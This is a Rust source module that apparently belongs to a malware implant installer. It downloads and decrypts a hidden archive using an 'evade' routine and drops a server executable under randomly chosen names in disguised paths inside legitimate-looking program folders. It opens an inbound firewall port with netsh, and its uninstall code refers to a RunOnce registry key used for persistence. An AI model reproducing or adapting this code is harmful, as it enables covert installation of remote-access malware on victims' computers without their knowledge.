#![allow(non_snake_case)]

use std::{
    io::{self, Read},
    path::PathBuf,
    fs::{OpenOptions, create_dir_all, rename, remove_file, remove_dir}
};
use rand::{
    thread_rng,
    rngs::ThreadRng,
    prelude::SliceRandom, Rng,
};
use serde::{
    Deserialize,
    Serialize
};
use crate::log;
use crate::constants::TEHRAN_NAME;
use crate::constants::ardakan::{
    ARDAKAN_NAME_PREFIXES,
    ARDAKAN_NAME_SUFFIXES,
    DEFAULT_DOWNLOAD_LINK
};
use crate::utils::{
    evade_decrypt_move_file,
    extract_zip_and_remove,
    cmd_with_output,
    download_file,
    wait_for_internet_connection,
};

#[derive(Serialize, Deserialize, Debug)]
pub struct ArdakanConfig {
    pub filename: PathBuf,
    pub path: PathBuf,
    pub hash: [u8; 32],
    pub archive_path: PathBuf,
    pub archive_filename: PathBuf,
    pub archive_hash: [u8; 32],
    pub archive_link: String,
}

impl ArdakanConfig {
    pub fn get_filepath(&self) -> PathBuf {
        return self.path.join(&self.filename);
    }
    pub fn get_archive_filepath(&self) -> PathBuf {
        return self.archive_path.join(&self.archive_filename);
    }
    pub fn get_decrypted_archive_filepath(&self) -> PathBuf {
        return self.path.join(&self.archive_filename);
    }
    pub fn generate_filename_path(rng: &mut ThreadRng, HOMEDRIVE: &str) -> (PathBuf, PathBuf) {
        let mut name: String = format!("{}{}", ARDAKAN_NAME_PREFIXES.choose(rng).unwrap_or(&"Stb"), ARDAKAN_NAME_SUFFIXES.choose(rng).unwrap_or(&"Runtime"));
        let path: PathBuf = match rng.gen_range(0..8) {
            0 => [HOMEDRIVE, "\\Windows", "Resources", "Custom", &name].iter().collect::<PathBuf>(),
            1 => [HOMEDRIVE, "\\Program Files", "Mozilla Firefox", "accessory", &name].iter().collect::<PathBuf>(),
            2 => [HOMEDRIVE, "\\Program Files", "Windows Media Player", "Default", &name].iter().collect::<PathBuf>(),
            3 => [HOMEDRIVE, "\\Program Files (x86)", "Realtek", "Custom", &name].iter().collect::<PathBuf>(),
            4 => [HOMEDRIVE, "\\ProgramData", "Microsoft", "Windows", "WordAddons",  &name].iter().collect::<PathBuf>(),
            5 => [HOMEDRIVE, "\\Program Files (x86)", "Internet Explorer", "cache", &name].iter().collect::<PathBuf>(),
            6 => [HOMEDRIVE, "\\ProgramData", "Google", "Chrome", "Configuration", &name].iter().collect::<PathBuf>(),
            7 => [HOMEDRIVE, "\\ProgramData", "Microsoft", "Windows", "Themes", "Custom",  &name].iter().collect::<PathBuf>(),
            _ => [HOMEDRIVE, "\\Program Files", "Windows Media Player", "Default", &name].iter().collect::<PathBuf>(),
        };
        name.push_str(".exe");
        let filename: PathBuf = PathBuf::from(name);
        return (path, filename);
    }
    pub fn regenerate_filename_path(&mut self, rng: &mut ThreadRng, HOMEDRIVE: &str) {
        log("+-- [INFO] regenerating the path and filename of the ardakan config...");
        (self.path, self.filename) = Self::generate_filename_path(rng, HOMEDRIVE);
    }
    pub fn install(&self) -> io::Result<()> {
        log("+-- [INFO] installing ardakan executable...");
        match create_dir_all(&self.path) {
            Ok(..) => {
                let encrypted_archive_filepath: PathBuf = self.get_archive_filepath();
                let decrypted_archive_filepath: PathBuf = self.get_decrypted_archive_filepath();
                evade_decrypt_move_file(&encrypted_archive_filepath, &decrypted_archive_filepath)?;
                match extract_zip_and_remove(&decrypted_archive_filepath, &self.path) {
                    Ok(..) => {
                        let filepath: PathBuf = self.get_filepath();
                        rename(self.path.join("Ardakan-Server.exe"), &filepath)?;
                        let command: String = format!("netsh advfirewall firewall add rule name=\"{}\" dir=in action=allow protocol=TCP localport=59325 program=\"{}\" enable=yes", self.filename.display(), filepath.display());
                        log("+---- [INFO] executing netsh command...");
                        match cmd_with_output(&command) {
                            Ok(string) => {
                                log(&format!("+---- {}", string));
                                log(&format!("+-- [INFO] done -> {}", self.path.display()));
                                return Ok(());
                            },
                            Err(error) => {
                                log(&format!("+-- [ERROR] failed to execute netsh command\n+-- /////// {}", error));
                                return Err(error);
                            },
                        }
                    },
                    Err(error) => {
                        log(&format!("+-- [ERROR] failed to unzip the ardakan backup archive : {} to {}\n+-- /////// {}", decrypted_archive_filepath.display(), self.path.display(), error));
                        return Err(error);
                    },
                }
            }
            Err(error) => {
                log(&format!("+-- [ERROR] failed to create the ardakan directory : {}\n+-- /////// {}", self.path.display(), error));
                return Err(error);
            },
        }
    }
    pub fn uninstall(&self) {
        log("+-- [INFO] uninstalling ardakan executable...");
        {
            let command: String = format!("taskkill /F /IM {}", &self.filename.display());
            log("+---- [INFO] executing taskkill command");
            let output = cmd_with_output(&command);
            match output {
                Ok(string) => log(&format!("+---- {}", string)),
                Err(error) => log(&format!("+---- [WARNING] failed to execute taskkill command\n+---- ///////// {}", error)),
            }
        }
        {
            let command: String = format!("REG DELETE HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v LaunchArd /f");
            log("+---- [INFO] executing reg delete command");
            let output = cmd_with_output(&command);
            match output {
                Ok(string) => log(&format!("+---- {}", string)),
                Err(error) => log(&format!("+---- [WARNING] failed to execute reg delete command\n+---- ///////// {}", error)),
            }
        }
        let filepath: PathBuf = self.get_filepath();
        match remove_file(&filepath) {
            Ok(..) => log(&format!("+---- [INFO] removed file : {}", self.filename.display())),
            Err(error) => log(&format!("+---- [WARNING] failed to remove file : {}\n+---- ///////// {}", self.filename.display(), error)),
        }
        match remove_dir(&self.path) {
            Ok(..) => log(&format!("+---- [INFO] removed directory: {}", self.path.display())),
            Err(error) => log(&format!("+---- [WARNING] failed to remove directory : {}\n+---- ///////// {}", self.path.display(), error)),
        };
        let command: String = format!("netsh advfirewall firewall Delete rule name=\"{}\"", self.filename.display());
        log("+---- [INFO] executing netsh command");
        match cmd_with_output(&command) {
            Ok(string) => log(&format!("+---- {}", string)),
            Err(error) => log(&format!("+---- [WARNING] failed to execute netsh command\n+---- ///////// {}", error)),
        }
        log("+-- [INFO] done");
    }
    pub fn archive_install(&self) -> io::Result<()> {
        log("+-- [INFO] downloading ardakan backup archive...");
        log("+---- [INFO] awaiting internet connection...");
        wait_for_internet_connection();
        download_file(Some(&self.archive_path), &self.archive_link, &self.archive_filename)?;
        log("+-- [INFO] done");
        return Ok(());
    }
    pub fn archive_uninstall(&self) {
        log("+-- [INFO] removing ardakan backup archive...");
        let filepath: PathBuf = self.get_archive_filepath();
        match remove_file(&filepath) {
            Ok(..) => log(&format!("+---- [INFO] removed file : {}", &filepath.display())),
            Err(error) => log(&format!("+---- [WARNING] failed to remove file : {}\n+---- ///////// {}", &filepath.display(), error)),
        }
        log("+-- [INFO] done");
    }
    pub fn default(HOMEDRIVE: &str) -> io::Result<Self> {
        log("+-- [INFO] creating default ardakan config");
        let mut rng : ThreadRng = thread_rng();
        let filepath: PathBuf = PathBuf::from(format!("{}_1.default", TEHRAN_NAME));
        if !filepath.is_file() {
            Self::default_install()?;
        };
        let mut buffer: String = String::new();
        let mut file = OpenOptions::new().read(true).open(&filepath)?;
        file.read_to_string(&mut buffer)?;
        let mut config = serde_json::from_str::<Self>(&buffer)?;
        config.regenerate_filename_path(&mut rng, HOMEDRIVE);
        log("+-- [INFO] done");
        return Ok(config);
    }
    pub fn default_install() -> io::Result<()> {
        log("+-- [INFO] downloading default ardakan config...");
        log("+---- [INFO] awaiting internet connection...");
        wait_for_internet_connection();
        download_file(None, DEFAULT_DOWNLOAD_LINK, &PathBuf::from(format!("{}_1.default", TEHRAN_NAME)))?;
        log("+-- [INFO] done");
        return Ok(());
    }
}